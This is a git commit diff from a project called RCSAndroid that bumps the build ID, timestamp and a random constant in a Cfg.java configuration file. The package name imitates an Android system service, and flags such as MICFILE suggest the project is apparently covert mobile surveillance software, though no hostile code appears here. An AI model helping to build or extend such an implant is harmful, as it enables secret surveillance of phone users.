3380b8314ee4d3d05158d6276497c34fb798826e
Fabrizio Cornelli <finance@suppose.it>
2012-06-13 17:31:24 +0200

    prima che quez faccia il push...

--- RCSAndroid/src/com/android/service/auto/Cfg.java
+++ RCSAndroid/src/com/android/service/auto/Cfg.java
@@ -3,8 +3,8 @@ package com.android.service.auto;
 public class Cfg {
 	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
 	
-    public static final int BUILD_ID = 1;
-    public static final String BUILD_TIMESTAMP = "20120613-042501";
+    public static final int BUILD_ID = 5;
+    public static final String BUILD_TIMESTAMP = "20120613-043613";
     
     public static final int VERSION = 2012041602;
 	public static final String OSVERSION = "default";
@@ -20,5 +20,5 @@ public class Cfg {
 	public static final boolean ACTIVITY = false;
 	public static final boolean MICFILE = false;
 	
-	public static final String RANDOM = "B4019B2F37E8C8BB";
+	public static final String RANDOM = "9D0ECBE18DD78A04";
 }
